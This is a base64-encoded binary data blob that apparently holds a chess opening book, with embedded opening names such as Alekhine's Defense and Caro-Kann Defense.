EBgSjf//NycYjf//CRIejf//OyMkjf//EiMqjf//Pi4wjf//HBI2jf//LCM8jf//EiNCjf
//LSVIjf//CxxOjf//Jh5Ujf//FQtajf//Pz5gjf//ARJmjf//NS1sjf//Aglyjf//NiZ4
jf//CRl+jf//PD76jDoshI3//wQGio3//yIwlI3//wUMmo3//xUlAAD//z08po3//x4VrI
3//yQbso3//wkbuI3//y0vvo3//ycvxI3//zApyo3//xop0I3//yst1o3//wcn3I3//y0v
4o3//wsa6I3//z497o3//y439I3//zsr+o3//ycuAI7//z0tBo7//wQDDI7//x8OEo7//w
4WGI7//x0VHo7//wMeJI7//y4fKo7//xUnMI7//yobNo7//wwVPI7//x4VQo7//xkhSI7/
/zcnTo7//w8fVI7//zw+Wo7//wACYI7//zQuZo7//wUMbI7//zoeco7//wELeI7//yM0fo
7//xQchI7//yUdio7//wIJkI7//zUllo7//ywjAAD//wMYoo7//zg8qI7//xESro7//zwz
tI7//wwDuo7//zoswI7//wUExo7//zstzI7//wMR0o7//yQd2I7//wId3o7//xojAAD//z
st6o7//xAY8I7//zoe9o7//wkS/I7//yMSAo///wwaCI///z4/Do///xMbFI///zw+Go//
/wESII///yMd5I4kHSaP//8UHSyP//8lHTaP//8EBjyP//81JUKP//8DCwAA//82NE6P//
8UClSP//8uKVqP//8HJ2CP//80NmaP//8vB2yP//8+LnKP//8OFHiP//88NH6P//8oL4SP
//85MYqP//8iHJCP//86OZaP//8vKJyP//8/PqKP//8QGaiP//8KGa6P//8EA7SP//8bCr
qP//8UDsCP//8MG8aP//8lFMyP//8qDtKP//8HL9iP//87PN6P//8UJeSP//8zKuqP//8c
IvCP//8xOvaP//8iGfyP//85MQKQ//8JMQiQ//8bDA6Q//8hCRSQ//80MxqQ//8KIiCQ//
8qGyaQ//8aFCyQ//8pFDKQ//8LFDiQ//8jFD6Q//8NFESQ//8dFEqQ//8PFlCQ//8eFlaQ
//8BIVyQ//8oIWKQ//8ZIWiQ//8tI26Q//8AAXSQ//8wKHqQ//8JGYCQ//86OYaQ//8SHI
yQ//8jLZKQ//8cEpiQ//88Op6Q//8CC6SQ//86JaqQ//8LHLCQ//8lHbaQ//8DCryQ//81
JcKQ//8VC8iQ//8mHs6Q//8FDNSQ//87NNqQ//8LGuCQ//82JuaQ//8JGZyOBQxIjwEL7J
D//zAooI0iKfKQ//8MFACR//8kGwAA//8UGxCR//8sGxaR//8DERyR//8rNCKR//8CEiiR
//80LS6R//8LFTSR//8bLDqR//8eF0CR//8+P0aR//8OFkyR//84O1KR//8VHliR//8yKl
6R//8AAmSR//87K2qR//8EBnCR//88PnaR//8BC3yR//8qG4KR//8MFYiR//8eFY6R//8C
FJSR//86HpqR//8CKgAA//82PaaR//8gMKyR//83NrKR//8QCLiR//82Lr6R//8MHsSR//
8/N8qR//8PF9CR//89PNaR//8FAtyR//83L+KR//8REOiR//8yKu6R//8AIPSR//87G/qR
//8VGwCS//8qGwaS//8QGQyS//80GRKS//8iGRiS//8+Px6S//8KESSS//8sESqS//8LET
CS//8YGTaS//8JGTyS//8gGEKS//8EBkiS//86LE6S//8FDFSS//8wIFqS//8UImCS//8l
HWaS//8DCmyS//81JXKS//8BC3iS//88Pn6S//8FDKCRAhSEkv//IymKkv//DByUkv//Gx
IAAP//ODugkv//FBumkv//Ihuskv//AhSykv//KyK4kv//Axu+kv//IhrEkv//DR3Kkv//
KiLQkv//BQPWkv//Oijckv//BAbikv//MSrokv//ISrukv//Mir0kv//Exz6kv//LRwAk/
//CxwGk///JRwMk///BQ4Sk///JBsYk///FRsek///Khskk///GSEqk///MCAwk///DhY2
k///PD48k///DBxCk///Iy1Ik///AQtOk///OzRUk///CRlak///PStgk///NiYAAP//CR
lsk///Iilyk///Awp4k///PD5+k///BAaEk///PSKKk///BQ6Qk///OiyWk///Dhack///
Oy2ik///Ji2ok///Ny+uk///Aia0k///CRkAAP//Iy26kz0rwJP//wMKZpMBEsaT//8DCw
AA//8RC9qT//8cC+CT//84OuaT//8CAeyT//8bEfKT//8LEviT//8lG/6T//8UCwSU//8b
JQqU//8LFBCU//8lGxaU//8UCxyU//8bJSKU//8LFCiU//8eLC6U//8PFzSU//8xKTqU//
8FBECU//86HkaU//8SHEyU//8lG1KU//8VG1iU//8qG16U//8AAmSU//80JWqU//8CC3CU
//83L3aU//8BEnyU//8jNIKU//8EBoiU//88Po6U//8FDpSU//89NpqU//8HNwAA//8AOK
aU//8TDKyU//8gI7KU//8aI7iU//8lI76U//8ME8SU//8bE8qU//8NDNCU//8cFNaU//8/
ONyU//8+NeKU//8vP+iU//8ZIO6U//8DHvSU//89JfqU//8eJQCV//80JQaV//8MHgyV//
8lHBKV//8TGhiV//8sGh6V//8PLySV//86LCqV//8nDDCV//8rGTaV//8kGjyV//81JUKV
//8EDUiV//87K06V//8KD1SV//8gAFqV//8QGWCV//8hGWaV//8JAmyV//8aEnKV//8VJH
iV//8iGn6V//8CCoSV//84IIqV//8LFZCV//8uNJaV//8MJ5yV//8yIqKV//8NHaiV//8x
Ka6V//8OFrSV//8oIbqV//8fB8CV//80LsaV//8HH8yV//8mH9KV//8PH9iV//8wKN6V//
8FDOSV//8kG+qV//8VG/CV//8qG/aV//8ZIfyV//8uJgKW//8AAgiW//83Lw6W//8BCxSW
//88PhqW//8CCSCW//89NiaW//8GLgAA//8eLDKW//8EBjiW//82PT6W//8QEkSW//8WHk
qW//8tHlCW//89NlaW//8YEFyW//8sHmKW//8DGGiW//8zO26W//8FDHSW//8XFnqW//8O
D4CW//8WF4aW//8KDoyW//8hEJKW//8JEJiW//82PZ6W//8GB6SW//8mFqqW//8PFbCW//
8+NraW//8eLbyW//8kHcKW//8NHciW//89EM6W//8SCtSW//8bIdqW//8UHuCW//87OOaW
//8ZIOyW//8oIPKW//8AA/iW//8qG/6W//8iEgSX//82PQqX//8OFhCX//8tJhaX//8VDx
yX//8nHiKX//8XHiiX//8mHi6X//8KIjSX//8vJzqX//8aFECX//80LUaX//8DAEyX//89
O1KX//8MBViX//87M16X//8CCmSX//84O2qX//8AAnCX//87NHaX//8FBHyX//86LIKX//
8PF4iX//80Lo6X//8LGpSX//8uJpqX//8CCaCX//8wKKaX//8JGayX//83L7KX//8BC7iX
//88Pr6X//8EBsSX//8NHQAA//81NtCX//8MFNaX//87M9yX//8sKuKX//8vJ+iX//8kLO
6X//84O/SX//8bI/qX//8wOACY//8TGwaY//82NQyY//8sJBKY//8rJBiY//8VJB6Y//8i
KySY//8tLCqY//83NjCY//8sLTaY//82LTyY//87LUKY//89IkiY//8jO06Y//80NlSY//
8qLFqY//81LWCY//8aI2aY//82PWyY//8OFnKY//84MHiY//8RGn6Y//8+N4SY//8CKoqY
//8rKpCY//8BApaY//87K5yY//8CKqKY//8zNKiY//8QNK6Y//8xKbSY//8PH7qY//83L8
CY//8HAsaY//8rM8yY//8JENKY//89O9iY//8QGN6Y//88PuSY//8DEeqY//8zK/CY//8C
CfaY//8vNvyY//8LFQKZ//8bMwiZ//8EDA6Z//8eDBSZ//8AARqZ//87GyCZ//8VGyaZ//
8qGyyZ//8ZITKZ//8wIDiZ//8JGT6Z//89L0SZ//8BC0qZ//89NsqXOh5Qmf//CRkslgUM
Vpn//yM0YJn//w4WoJQMHGqZ//82JAAA//8BC3qZ//89NoCZ//8EA4aZ//87A4yZ//8bJJ
KZ//8qJJiZ//8VJJ6Z//8mHqSZ//8TG6qZ//82JrCZ//8uHwAA//8PFryZ//8fFsKZ//8V
HsiZ//8nH86Z//8GDtSZ//89ItqZ//8NFeCZ//8vJ+aZ//8VBOyZ//8mHvKZ//8OFviZ//
80Lv6Z//8EBgSa//82Jgqa//8CFLaZBQwQmv//IzQWmv//HCQAAP//KTMmmv//Awosmv//
JCsymv//AiI4mv//PDo+mv//CRlEmv//OixKmv//AAJQmv//JiRWmv//Egxcmv//JBtimv
//JRtomv//OyZumv//AiZ0mv//Lyd6mv//BAaAmv//KhuGmv//ARKMmv//DhwAAP//OxOY
mv//HCWemv//GyWkmv//DR0AAAELqpr//y8nsJr//wIUAAD//zs0wJr//zosAAD//zosAA
D//wEL0pr//xsJ2Jr//zosAAD//wIK5Jr//zIq6pr//wAC8Jr//yYC9pr//wMV/Jr//x4d
Apv//wQCAAD//zosDpv//yIKAAD//zs0Gpv//ykzAAD//yEyJpv//zw9LJv//yEbIJsiJD
Kb//8/Lzib//8CIkKb//8yKkib//8SIU6b//8kG1Sb//8AAwAA//8YG2Cb//8ECwAA//8k
G2yb//8UG3Kb//87G3ib//8YGwAA//8eFQAA//8EBoqb//8bCZCb//8UG4SbFCaWm///Ox
ucm///BAZmmwkZfpsNFaab//84GKyb//8CFLqb//8wKcCb//8jKcab//8yKsyb//8CFBSb
ExtamxIj0pv//xs72Jv//wMC5pv//y8m7Jv//w0dCJsCJvKb//80Jvib//8CFN6aARICnP
//OxsInP//BAa6miU0xpolL8yaJRsSnP//NCaSmiobGJz//x8lKpz//yMpNJz//yMpAAD/
/wwcOpwBEkCc//89NEac//87MwAA//8BElac//86LFyc//8VH1CcFQtinP//Jh5onP//BQ
5ynP//NiZ4nP//IxIAAP//IxQAAP//DxeKnP//Oh6QnP//GSEAAP//MiKcnP//AxWinP//
GxWonP//AAgAAP//LRu0nP//FBu6nP//IRrAnP//LSoAAP//PRkAAP//AAjSnP//LSrYnP
//DBTGnBoJzJwaC96c//8xIeSc//8kGvKc//87Lfic//8ACAAA//84OwSd//8DEQqd//81
LBCd//8aLBad//86LByd//8MBCKd//8OHSid//8gKQAA//8FBjSd//86Fzqd//8EDC6dBA
VAnf//HQ5Gnf//BRpQnf//Ix1Wnf//Ix0AAP//GyRcnRsiYp3//zwkaJ3//wAkAAD//xsk
eJ3//zwkfp3//wUThJ3//yAAip3//xAZkJ3//yIZlp3//wELcp0DC5yd//87IKKd//8jHQ
AA//8jHQAA//8ACLid//8PJL6d//8WDsSd//8fD8qd//8GDrKdBhbQnf//Ox/Wnf//GyTg
nf//PCTmnf//ODoAAP//ARLynf//GxT4nf//DRT+nf//IxQEnv//CAsKnv//OiUQnv//AA
gWnv//Ihscnv//Axsinv//Hxsonv//JBYunv//Ox80nv//OiwAAP//AyNAnv//OylGnv//
GyRMnv//PCRSnv//IhsAAP//Awpenv//IxJknv//OiwAAP//LRIAAP//DBxwngwUdp7//z
Y/fJ7//y0fAAD//w0UjJ7//zwUkp7//wcGhp4MFJie//8jHZ6e//8BC6ie//87La6e//8b
IrSe//8+Nrqe//8MFAAA//87Lcae//8DG8ye//88JNKe//8MHKydBwbsnQwUOp4PH1ieAQ
tqniQ2wJ4bItie//89PN6e//8TG/ye//88PgKf//88OwAA//8cJA6f//87KRSf//8YHBqf
//86MyCf//8JJAifAxgmn///PSIsn///BAYAAP//Ix08n///JBZCn///OyZIn///BQ5On/
//IhlUn///GSI2nwkkWp///zIiYJ///w4Vap///xsVcJ///wELhJwVC5acDBSunBUk/pwC
CXaf//8qG3yf//8DCgAA//89NJif//8VC56f//8mHqSf//8RAwAA//8qG7Cf//8DEbaf//
8sEbyf//8LEcKf//8/L8if//8UL86f//89L9Sf//8JGdqf//8vJ+Cf//8aC+af//86Oeyf
//8AAvKf//81Lfif//8EBv6f//88OgSg//8CFAqg//8rMxCg//8LGhag//86LByg//8vJw
AA//8VCyKgFR8ooP//Jh4uoP//KzMAAP//AAI+oP//OixEoP//Ky0AAP//CxpQoP//LydW
oP//BQxKoBULXKD//z02YqD//wUMOKACFGyg//8jK3Kg//8lHQAA//8JEYKg//81JYig//
8DCo6g//86LJSg//8VC5qg//8mHqCg//8MFKagDBx8oP//OyOsoP//DBSqnxIjtqD//zYm
vKD//wYHAAD//zg5zKD//xUM0qD//zEh2KD//wQG3qD//ysi5KD//wwV6qD//x4V8KD//w
8X9qD//zoe/KD//xQcAqH//zs0CKH//wUMDqH//zw+FKH//wkSGqH//yMSIKH//wESJqH/
/wUhAAD//yokAAD//xUbOKH//z02MqEkGz6h//8TG0Sh//89KyyhNiZOof//DBwgmg4Wfp
wJGZKfARLGoAwUVKH//zoe0Is9IgqRPTSakjUl0JM2LnCZNy9eof//KhsAAP//GSGOof//
LBeUof//CRmaof//Ny+gof//Agumof//Niasof//KhsAAP//Axi4of//Ojm+of//AhTEof
//LCPKof//CBCyoRIj0KH//zw61qH//yoZAAD//wUN5qH//ywa7KH//wwU8qH//yMt+KH/
/w0V/qH//y0lBKL//xUECqL//yQcEKL//wES4KETGxai//87Mxyi//8pIwAA//8DAiyi//
8gGDKi//8CIjii//80Ij6i//8YIkSi//88Pkqi//8AAlCi//89NFai//8CC1yi//84KGKi
//8SGGii//8wIG6i//8PF3Si//8jKXqi//8BEoCi//87M4ai//8EBiaiCBCMov//NS2Sov
//BQ6cov//Oiyiov//JR0AAP//AAOuov//NSW0ov//Agu6ov//Pj/Aov//AwrGov//PD7M
ov//BAbSov//PTbYov//BQzeov//Nibkov//CBDqov//MCjwov//NC4AAP//Ah38ov//Oh
4Co///EiEIo///JBsOo///ExsUo///IzQao///DBT2ogwcIKP//xhvNy8mo///CBB0oQ4W
qKIBEjOj//85Kjij//8GFTOj//85Kkyj//8GFUajARJSo///LSNYo///GiNio///MyNoo/
//JR0AAP//FQZ0o///Jh56o///BgeAo///NiaGo///AAOMo///LDqSo///GCKYo///MzWe
o///Ehiko///NC2qo///JBsAAP//Exu2o///NC28o///Ix0AAP//FQTIo///JBzOo///BQ
PCowIL1KP//zAo2qP//yoZAAD//xAZ6qP//yMZ8KP//xgJ5KMYIvaj//8xIfyj//8JGQak
AgsAAP//MysMpP//AguwoxIYFqT//zg7HKT//wMKJqT//xhvNSUspP//BAY1pP//OzM6pP
//CBA1pP//OzNGpP//CBBApAQGTKT//xhvOixSpP//BQxfpP//PD5kpP//ARJfpP//PD5w
pP//ARJqpAUMdqQIEAAA//89NHyk//8LE4qkBSEAAAESAAAIEAAA//85KpCk//8yIgAA//
8GFaKkCBCopP//LSOupP//GiO4pP//MyO+pP//KhsAAP//EhvKpP//IhvQpP//CxvWpP//
OjncpP//HB7ipP//PzzopP//GBzupP//JRz0pP//Dhz6pP//PDoApf//AxgGpf//OiUMpf
//DBQSpf//Oy0Ypf//BQ4epf//PSIkpf//FQYqpf//JBwwpf//CRI2pf//IxI8pf//CxMz
ow4WQqX//zkqSKX//zAoAAD//yMqAAD//xUfXqX//yQcZKX//wYVaqX//zsjcKX//wkSdq
X//yMSfKX//zs6AAD//wImiKX//zozjqX//xAZlKX//xIjmqX//wgQoKX//zw7pqX//wM7
rKX//yMSsqX//xskuKX//z0ZvqX//wYVUqUMFFilDhaCpQsbxKX//y0jyqX//xoj3KX//z
Mj4qX//zIiAAD//wUM7qX//zw+9KX//wES+qX//z0ZAKb//wsTBqb//zMjDKb//xQbEqb/
/yobGKb//zw6AAD//wUOJKb//zolKqb//w4WMKb//yMkNqb//wESPKb//zsjQqb//xojSK
b//zMjTqb//zsfAAD//wsTWqb//yUcYKb//xIcZqb//y0cbKb//xUccqb//z0ieKb//w0V
fqb//zolhKb//wESiqb//zMqkKb//wwUHqYbClSmGyqWpv//OSqcpv//FRuqpv//JBywpv
//CxNuowwUxKQIEAAADhYAAAES6KUGFbam//8Ybz4tvKb//0FsZWtoaW5lJ3MgRGVmZW5z
ZQAALBEAAP//Fh3ypv//Ix34pv//BQb+pv//PD4Ep///BAUKp///PRkQp///HRYWp///LS
Mcp///EiEip///Ihsop///FBsup///Ixs0p///KhsAAP//JyJAp///PDNGp///AydMp///
PSJSp///GRMAAP//BQxep///Khlkp///ESJYpw4Waqf//zstcKf//xQdeqf//yMdgKf//y
EShqf//y0jjKf//xojkqf//zAomKf//woanqf//zg6pKf//zsjAAD//wsjsKf//ywjtqf/
/wkRvKf//xgQwqf//xEAyKf//yAYzqf//xIj1Kf//zYt2qf//yYt4Kf//zAg5qf//x0vAA
D//wcF8qf//zg7+Kf//xEL/qf//z0dBKj//xQdCqj//zs9EKj//xMzFqj//z0dHKj//wMT
Iqj//xkTKKj//wsTLqj//ywzNKj//woaOqj//xsTQKj//wUhRqj//yoZTKj//wgYUqj//z
AgWKj//xUcXqj//y0cZKj//xIcaqj//yMbcKj//zQmAAD//xQbfKj//x0bgqj//w0UiKj/
/xwUjqj//zQmAAD//yEblKgLHZqo//89HaCo//8WHaqo//8jHbCo//8OFrao//8tI7yo//
8SIcKo//8iG8io//8IEc6o//8sEdSo//8UG9qo//8jG+Co//8dJuynDRV2qAUM5qj//zw+
7Kj//wQC+qj//z00AKn//zAoAAD//w4VDKn//xwVEqn//w0VGKn//zUsHqn//yUsJKn//y
ksKqn//wQCMKn//zspNqn//xQbPKn//yobQqn//xEbSKn//yIaTqn//yclVKn//yw1Wqn/
/wMnYKn//zYtZqn//yYtbKn//z00cqn//wUMOqcSIaqnAwsGqR0meKn//z4tfqn//wwUkK
n//zkqlqn//wIdnKn//zosoqn//wESqKn//yUcrqn//xMctKn//zUluqn//xsRwKn//zIi
xqn//wsTzKn//zMj0qn//xUb2Kn//96mJBzeqf//Q2Fyby1LYW5uIERlZmVuc2UANi4AAP
//Dx/+qf//PDUEqv//AAIKqv//MCgQqv//ARAWqv//KxAcqv//GBAiqv//OTMoqv//Axgu
qv//PjQ0qv//Ny8AAP//CBhAqv//MChGqv//ARJMqv//MipSqv//EhpYqv//Ni5eqv//Dx
9kqv//OTNqqv//PDUAAP//ARJ2qv//Mip8qv//EhqCqv//My2Iqv//AxGOqv//OTOUqv//
Fx2aqv//Ny+gqv//Bhemqv//Ni6sqv//AxFwqg8fsqr//z40uKr//zQjAAD//wUMyKr//x
0Uzqr//w0V1Kr//z892qr//xoj4Kr//ysd5qr//xQd7Kr//yUd8qr//wgY+Kr//zAo/qr/
/wMRBKv//z40Cqv//wESEKv//zIqFqv//wYMOqoOFsKqEhocq///NSUiq///DBQwq///Oy
s2q///HSs8q///PStCq///Ah1Iq///JBxOq///CxtUq///7KkzI1qr//9OaW16b3ZpY2gg
RGVmZW5zZQAZPQAA//8/Pnqr//86F4Cr//82P4ar//8VB4yr//8bNpKr//8cFZir//8DG5
6r//8qG6Sr//8GFaqr//8fHLCr//8OFrar//87H7yr//8VHMKr//89Gcir//8NFc6r//8k
HNSr//8sHgAA//8KGuCr//8lL+ar//8GDOyr//89K/Kr//8SGPir//8xKv6r//8hKgSs//
86LAqs//8OFhCs//80JRas//8PHxys//8kHCKs//8LGyis//8+NC6s//8LG9qrBSE0rP//
MyM6rP//DBRErAwc/yL//2irOSpKrP//Q2VudGVyIENvdW50ZXIgRGVmZW5zZQAAMiIAAP
//EBF0rP//AQB6rP//ERCArP//AwGGrP//ChGMrP//OwuSrP//GhSYrP//MSGerP//EBqk
rP//PzuqrP//CRKwrP//OwO2rP//AQq8rP//IxLCrP//EhnIrP//ODvOrP//ChLUrP//CB
narP//AgHgrP//GQjmrP//BALsrP//NC3yrP//ARD4rP//PDT+rP//HDQErf//MzQKrf//
JjQQrf//OzMWrf//CBIAAP//AgEirf//GQgorf//BAIurf//Pzw0rf//ARA6rf//MzRArf
//HDRGrf//PDNMrf//ITNSrf//OzRYrf//ITMcrSY0Xq3//yoZZK3//xgcbq3//y0jdK3/
/xwjeq3//z00gK3//wImhq3//zozjK3//wUhkq3//z4tmK3//y00AAD//woLpK3//zolqq
3//xYysK3//zsttq3//xgKvK3//xwiwq3//z02AAD//yo7zq3//yIY1K3//xsq2q3//xwi
4K3//woSyK0VG+at//8tHOyt//8fFvat//82Jvyt//8iKQAA//8EAgiu//8/PA6u//8YCh
Su//88Ohqu//8MFCCu//89Iiau//8BCyyu//86MzKu//8KEjiu//87LT6u//8mHwKuJi1E
rv//Ny9Krv//AiZUrv//Pi1arv//DByerQYVYK7//zMjZq7//yw1AAD//woudq7//zUufK
7//xUmgq7//y8miK7//xMujq7//zcvlK7//wMKmq7//zQuoK7//wUTpq7//zszrK7//wwU
sq7//z40uK7//wImvq7//z0rxK7//woSyq7//zos0K7//zsrAAD//wUM3K7//z084q7//w
YV6K7//zw+7q7//wwU9K7//zQt+q7//yYtAK///z00Bq///wImDK///z4tEq///wYV1q4K
Ehiv//8zIx6v//8bGHCuGwMor///OSour///Pi0AAP//ARI+r///OzNEr///BAZKr///Oi
xQr///BQ5Wr///Ny9cr///DhZir///OSpor///GxVur///MiJ0r///FRt6r///MyOAr///
Axs4rwYVhq///1ysJBuMr///WXVnb3NsYXYgRGVmZW5zZQAAARIAAP//PD6wr///FAK2r/
//JR28r///AhTCr///GxTIr///DBTOr///IxvUr///Chrar///PSvgr///BAbmr///Pi3s
r///BQ7yr///NSX4r///Dhb+r///OSoEsP//BhUKsP//nq8zIxCw//8lHQAA//8GDB6w//
88PiSw//8MFCqw//89KzCw//8CCTaw//8+LTyw//8JEUKwCxMAAP//NSVIsP//GAoAAP//
ARlYsP//ERhesP//AgFksP//CBFqsP//Bg1wsP//Hg12sP//BA18sP//Ig2CsP//EhiIsP
//OjmOsP//CRGUsP//GgiasP//AAKgsP//PzumsP//AzussP//KhmysP//DAS4sP//LBq+
sP//BQPEsP//NCLKsP//FCLQsP//LR7WsP//AhTcsP//PDrisP//AwzosP//OizusP//Ex
z0sP//Ixz6sP//DBwAsf//OSoGsf//BAYMsf//Ny8Ssf//ARIYsf//OzQesf//BhUksf//
Pi0qsf//BQ4wsf//PSI2sf//BQ5SsAsTPLH//zMjQrH//wwc5FwMFBNvChrZpgYV56kKEm
OrARJXrAsbma8LExmwDhZMsf//Ny8AAP//AgsAAP//BQ4AAP//BQ4AABojAAD//z0iirE9
GX6xPi2Esf//AQsAAP//ChIAAP//ChoAAP//AxgAAP//AiYAAP//EhwAAP//GDAAAP//OQ
nGsf//DRTMsf//IhTSsf//KBjYsf//Mzresf//JhTksf//NS3qsf//Aibwsf//PD72sf//
BAb8sf//ODkCsv//GCgIsv//LDMOsv//OzIAAP//CxIasv//OhIgsv//AhImsv//GxIssv
//DBQysv//PD44sv//AAI+sv//ODpEsv//AgtKsv//IhtQsv//AxgUsgkZVrL//yojXLL/
/xIYAAD//zg5bLL//zspAAD//wILeLL//zg6frL//wUDhLL//zAgirL//wMYkLL//ysZlr
L//wkRAAAYEpyy//8iK6Ky//8mAgAAJgsAAP//BQ0AAP//FAsAAP//FA0AAP//FAsAAP//
BAMAAP//Pj3Usv//AxHasv//PTzgsv//FA3msv//FBwAAP//FzPysv//AxX4sv//HBX+sv
//DBQEs///JBwKs///FAsQs///AAIAAP//CBAAAP//NCXssjQjFrM+PxyzPTkis///BQQo
s///BQ0AAP//MxdAs///CRFGs///ODxMs///AAUAAP//FwVYs///Ehxes///Pj9ks///Ax
Fqs///Mxdws///FAtSsxgSdrP//wUEAAD//ywXhrP//wkRjLP//zkhkrP//wACmLP//zQj
nrP//xQNpLP//ywRAAD//wkRAAD//zcvtrP//w4HvLP//yozwrP//wUEyLP//zQjzrP//x
QN1LP//zgq2rP//wkZAAADAQAA//84HOaz//8VHPCz//8kHPaz//8FDfyz//8sFwK0//8G
DuCzFAsItAgQsLP//zg5qrM9OQ60LBc6sywzfLM+P8KyODzIsjQjzrL//w0VHLT//zs4Or
T//w44QLT//ywbAAD//z06TLT//yIsUrT//yQbWLT//wMbXrT//xobZLT//xgiarT//ysi
cLT//ykidrT//zoafLT//xQbgrT//zwhiLT//wwUjrT//zs8lLT//zApmrT//yMboLT//x
QwprT//yMbRrQ4Oqy0//8mFLK0//8GBwAA//8bDMK0//8MFMi0//8pIs60//8CItS0//8q
G9q0//8FAuC0//89Oua0//8JEey0//80KvK0//8DGPi0//87Kf60//8mCwS1//86Igq1//
8YIhC1//8iG7KyIiu8tDg6FrUiDbyy//8SGBy1//81LS61//8CC3KyEhissgImNLX//yoj
OrX//wkZAAD//ywlTrX//xIcVLX//yMbWrX//wocAAD//yMcZrX//wwcbLX//yIrcrX//x
IYeLX//z07frX//wILYLUFA4S1//8CEAAA//8lLpS1//8OHJq1//8sJaC1//8SGKa1//8j
G6y1//8JEbK1//8KGgAA//8sJb61//8cJsS1//8iKcq1//8SHNC1//8sJQAA//8MFAAA//
8JEQAA//8SGAAA//8GBwAA//89LfS1//8YIvq1//8uHwC2//8MFAa2//80Lgy2//8WHRK2
//8rHRi2//8CHR62//8kHSS2//8NHSq2//8iKzC2//8SGAAA//8lHTy2//8NHQAA//8iK0
i2//8JEUK2EhhOtv//EhgAAP//FB0AAP//OzwAAD4/VLY9LV62JR1ktv//GiMAAP//JRR8
tv//CxSCtv//KRSItv//EhiOtv//JB2Utv//Cguatv//NCWgtv//DBSmtv//Oymstv//Bg
2ytv//ChMAAP//Ig24tiQdvrb//xYdxLb//yUdzrb//wIm1LYSGDa2DBRqtv//CREAAP//
PTzotv//GDzutv//KiP0tv//GiP6tv//OjsAt///EiMAAP//KiMMt///DR0AAP//IisYt/
//Ehget///NSUkt///ChgGtxojErcMFCq3//8iK+K1NSXatjs8MLc7M+i1OyDutf//CRHc
tQUDPrcCCwAAEhgAAP//OzqKtTg6VLciKbi1IxrWtf//GiNItQMKZrf//zw+eLf//wQGgr
caI2ay//86LIi3IxvAsf//Oh4AAP//ARIAAAELnLf//zw+orf//wELAAABEpK3BAast///
PjSytzostLE+Lbqx//8qIwAA//8aI863//8rLtS3//8DAtq3//87K+C3//8PFua3//8fFu
y3//8KGvK3//8nH/i3//8BEP63//8iEAS4//8CEAq4//8BEgAA//81LRa4//8CCRy4//83
JxC4PD4iuP//AgsAAP//KiMyuP//GiM4uP//MCk+uP//GClEuP//Jx9KuP//ChpQuP//Ii
lWuP//EhhcuP//Cx0AAP//OzNouP//CRFuuP//Iit0uP//Ehh6uP//PD6AuP//GCkAAP//
IimMuP//AwsAAP//IiuYuP//EhieuP//PD6kuP//AgmquP//OzOwuP//AwuGuBIYkrgJEb
a4//8sGgAA//8RGsq4//8aIgAA//8jGtC4IxvWuP//ChrcuP//IivmuP//AxMAABIY7LgD
CwAA//84OvK4//8DCgAA//8gKAa5//8CCwy5//84OxK5//8CCwAA//8qIx65//8MHBi5Gi
Mkuf//OyAquf//Cho0uf//Iis6uf//AgkAuRIYQLn//zosRrn//wkRULn//zcnYrg6Hry4
PD5WuTAgAAA6KAAA//86HgAA//8BEnK5//88Pni5//8JESi4ARJcuQMLfrn//z40hLn//w
oawLcEBpK5//89Ipi5OiiisT0ZqLE1Ja6x//8KGpSxBQ6iuf//MSq0uf//Gyq+uRsReLH/
/xsRAAD//zQkxLk7Kc65//8VG9S5//8jGwAA//8CFOS5//89NOq5//8EBvC5//84O/a5//
8FDvy5//86LAK6//8bEQi6//80JA66//8VGxS6//8iGxq6//8UCwAA//8ZICa6//8bISy6
//80JDK6//8VGzi6//8+LT66//8BEAAA//80JEq6//8FDlC6//8jG1a6//8KGly6//8KGg
AA//8LEgAA//8LFAAA//8ZK2K6GSlouhkJbroZInS6//8UC3q6ARJEuv//IhmMuv//AhSW
uv//KSKcuv//ChIguhsiorr//zcvAAD//wELsrr//zw+uLr//wMKvrr//z00xLr//wImyr
r//zg70Lr//wQG1rr//zos3Lr//xsR4rr//zQk6Lr//xUb7rr//yIb9Lr//xUbAAD//z02
ALv//wESBrv//yIgDLv//wIUErv//wMCAAD//z07Hrv//wELJLv//zw+Krv//wIJMLv//z
00Nrv//wkRPLv//xwVAAD//wIQSLv//yQcTrv//wIUAAD//yMaWrv//woaYLv//yIpZrv/
/wkZbLv//zAgcrv//xkhAAD//zg7frv//wkZhLv//yI0irv//xIckLv//zYtlrv//yYtnL
v//yMborv//wsRAAD//zYtrrv//yYttLv//zcvurv//wELAAD//yMbxrv//wwczLv//yIa
0rv//wsR2LsBEsC7//8BEgAA//8tJOi7//8dJO67//81LfS7//8NHfq7//8iKwC8//8LEQ
a8//8NHQAA//8eLRK8//8mAhi8//83Lx68//8BEiS8//8iKyq8//8LETC8//8SHAAA//8t
HDy8//8MHEK8//8rMki8//8mLQAA//8jG1S8//8DAk68DBxavP//PDpgvP//ARJqvP//Ix
sAAP//DBx2vP//Ghh8vP//AQuCvP//ODuIvP//ChKOvP//IitwvCIalLz//wwcAAD//zYt
pLz//yYtqrz//zg7sLz//wsRmrwBEra8//8DAAAA//8sI8a8//8BMcy8//8JCNK8//8AAd
i8//82Ld68//8cLeS8//8pCeq8//8mFPC8//89NPa8//8SHPy8//8jHAK9//88NAAA//8c
LQ69//89LxS9//8SHBq9//8jHCC9//8MHCa9//82LSy9//8MHAi9Ji0yvf//Iik4vf//AR
JCvf//BQYAAP//NC5Ovf//Bg5Uvf//OyNavf//DiNgvf//LCNmvf//DxZsvf//HxZyvf//
Eht4vf//Jx9+vf//ChKEvf//NyeKvf//AwuQvf//KjSWvf//HzScvf//LSWivf//Jh+ovf
//Ni2uvf//HC20vf//PTS6vf//EhzAvf//IxvGvf//ARLMvf//ODvSvf//BgUAAP//GgXe
vf//AALkvf//KBrqvf//Cxrwvf//LBr2vf//HSv8vf//KSgCvv//EBoIvv//PSIOvv//Gi
IUvv//NiYavv//Jh0gvv//JBsmvv//FBssvv//Ny8yvv//DBQ4vv//HAsAAP//JSxEvv//
GApKvv//GQpQvv//EApWvv//Khlcvv//Cxxivv//Ni1ovv//Ji1uvv//LCV0vv//Axh6vv
//PD6Avv//AAGGvv//PTSMvi0zPr7//wEQkr7//yoxAAD//wAbor7//yMqqL7//zYtrr7/
/xojtL7//wkAur7//yYtwL7//wEQAAD//zg6zL7//wMY0r7//yMbnL4pCca+IxrYvv//Cx
HYvQoa3r7//zw63rs9NLy8ODtIvSIp7L4tMwy8LR42vP//FQv2vgESqLv//zosEL///wIU
AAD//yIaIL///wsRJr///zosLL///xULMr///ygpAAD//wsRPr///zYtRL///yMtSr///z
w6UL///xIjVr///zQtXL///yYtYr///xooaL///xELbr///yMbdL///wImer///yIagL//
